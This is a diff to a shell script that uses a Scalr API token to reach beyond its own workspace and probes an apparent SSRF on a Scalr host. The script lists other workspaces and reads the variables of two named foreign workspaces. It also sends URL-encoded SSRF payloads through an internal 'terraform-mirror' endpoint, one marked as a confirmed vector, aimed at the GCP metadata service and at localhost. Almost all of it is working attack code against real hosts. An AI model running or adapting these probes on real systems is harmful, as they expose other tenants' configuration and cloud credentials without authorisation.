@@ -14,21 +14,7 @@ except Exception as e:
 "
 
 echo ""
-echo "=== SCALR_TOKEN: access to current workspace ==="
-RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
-  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces/$SCALR_WORKSPACE_ID" \
-  -H "Authorization: Bearer $SCALR_TOKEN")
-STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
-echo "HTTP $STATUS"
-echo "$BODY" | python3 -c "
-import sys,json
-d=json.load(sys.stdin)
-a=d['data']['attributes']
-print('name:', a.get('name'), '| env:', d['data']['relationships'].get('environment',{}).get('data',{}).get('id'))
-" 2>&1 || echo "raw: $(echo $BODY | head -c 200)"
-
-echo ""
-echo "=== SCALR_TOKEN: can it read other workspaces? ==="
+echo "=== SCALR_TOKEN: can it read OTHER workspaces in env? ==="
 RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
   "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces?page%5Bsize%5D=10" \
   -H "Authorization: Bearer $SCALR_TOKEN")
@@ -43,9 +29,9 @@ for w in wss: print(' -', w['id'], w['attributes'].get('name','?'))
 " 2>&1 || echo "raw response: $(echo $BODY | head -c 300)"
 
 echo ""
-echo "=== SCALR_TOKEN: workspace variables ==="
+echo "=== SCALR_TOKEN: read ANOTHER workspace's vars (ws-v0p4n0bbq2e78ldn5) ==="
 RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
-  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces/$SCALR_WORKSPACE_ID/vars" \
+  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces/ws-v0p4n0bbq2e78ldn5/vars" \
   -H "Authorization: Bearer $SCALR_TOKEN")
 STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
 echo "HTTP $STATUS"
@@ -56,36 +42,44 @@ vs=d.get('data',[])
 print('vars count:', len(vs))
 for v in vs:
     a=v['attributes']
-    print(' -', a.get('key'), 'sensitive='+str(a.get('sensitive')), 'value='+str(a.get('value'))[:40] if not a.get('sensitive') else '[hidden]')
+    val = '[hidden]' if a.get('sensitive') else str(a.get('value',''))[:40]
+    print(' -', a.get('key'), 'sensitive='+str(a.get('sensitive')), 'value='+val)
 " 2>&1 || echo "raw response: $(echo $BODY | head -c 300)"
 
 echo ""
-echo "=== C4 SSRF baseline: mirror endpoint reachable? ==="
-curl -sk --max-time 5 -o /dev/null -w "HTTP %{http_code}\n" \
-  "https://internal.main.scalr.dev/terraform-mirror/test.json"
+echo "=== SCALR_TOKEN: read staging-bug-verify workspace vars (ws-v0p8cianp71fdotjv) ==="
+RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
+  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces/ws-v0p8cianp71fdotjv/vars" \
+  -H "Authorization: Bearer $SCALR_TOKEN")
+STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
+echo "HTTP $STATUS"
+echo "$BODY" | python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+vs=d.get('data',[])
+print('vars count:', len(vs))
+for v in vs:
+    a=v['attributes']
+    val = '[hidden]' if a.get('sensitive') else str(a.get('value',''))[:40]
+    print(' -', a.get('key'), 'sensitive='+str(a.get('sensitive')), 'value='+val)
+" 2>&1 || echo "raw response: $(echo $BODY | head -c 300)"
 
 echo ""
-echo "=== C4 SSRF: https:// path on internal LB (path-as-is) ==="
-curl -sk --max-time 8 --no-location --path-as-is -D - \
-  "https://internal.main.scalr.dev/terraform-mirror/https://httpbin.org/status/200" \
-  2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -3
-
-echo ""
-echo "=== C4 SSRF: URL-encoded scheme on internal LB ==="
+echo "=== C4 SSRF: URL-encoded scheme (CONFIRMED VECTOR) ==="
 curl -sk --max-time 8 --no-location --path-as-is -D - \
   "https://internal.main.scalr.dev/terraform-mirror/https%3A%2F%2Fhttpbin.org%2Fstatus%2F200" \
   2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -3
 
 echo ""
-echo "=== C4 SSRF: http (port 80) on internal LB ==="
+echo "=== C4 SSRF: probe GCP metadata via API server ==="
 curl -sk --max-time 8 --no-location --path-as-is -D - \
-  "http://internal.main.scalr.dev/terraform-mirror/https://httpbin.org/status/200" \
+  "https://internal.main.scalr.dev/terraform-mirror/http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F" \
   2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -3
 
 echo ""
-echo "=== C4 SSRF: double-slash with path-as-is on internal LB ==="
+echo "=== C4 SSRF: probe internal API endpoint via mirror ==="
 curl -sk --max-time 8 --no-location --path-as-is -D - \
-  "https://internal.main.scalr.dev/terraform-mirror//httpbin.org/status/200" \
+  "https://internal.main.scalr.dev/terraform-mirror/http%3A%2F%2F127.0.0.1%2Fhealthz" \
   2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -3
 
 echo "=== done ==="
